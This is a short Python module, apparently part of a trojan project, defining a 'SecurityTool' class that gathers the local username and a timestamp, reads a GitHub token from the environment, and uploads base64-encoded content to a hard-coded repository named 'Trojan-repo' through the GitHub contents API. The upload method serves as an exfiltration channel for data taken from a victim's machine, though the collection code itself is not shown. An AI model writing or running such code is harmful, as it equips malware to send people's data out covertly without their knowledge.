import os
import requests
import base64
from datetime import datetime
from dotenv import load_dotenv
load_dotenv()


class SecurityTool:
    def __init__(self):
        self.username = os.environ.get("USER") or os.environ.get("USERNAME") or "Unknown"
        self.current_time = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        self.github_token = os.getenv("GITHUB_TOKEN")
        self.repository_owner = "BlertaJashanica"
        self.repository_name = "Trojan-repo"

    def push_to_github(self, file_path, content, commit_message):
        """Push a file to a GitHub repository."""
        # Encode content to Base64
        file_content_encoded = base64.b64encode(content.encode()).decode()

        # GitHub API URL
        api_url = f"https://api.github.com/repos/{self.repository_owner}/{self.repository_name}/contents/{file_path}"
        headers = {
            "Authorization": f"Token {self.github_token}",
            "Accept": "application/vnd.github.v3+json"
        }

        # Check if the file already exists
        response = requests.get(api_url, headers=headers)
        sha = response.json().get("sha") if response.status_code == 200 else None

        # Prepare the payload for the PUT request
        payload = {
            "message": commit_message,
            "content": file_content_encoded,
            "sha": sha
        }

        # Push the file
        response = requests.put(api_url, json=payload, headers=headers)
        if response.status_code in [200, 201]:
            print("File pushed successfully!")
        else:
            print("An error occurred while pushing the file:", response.json())
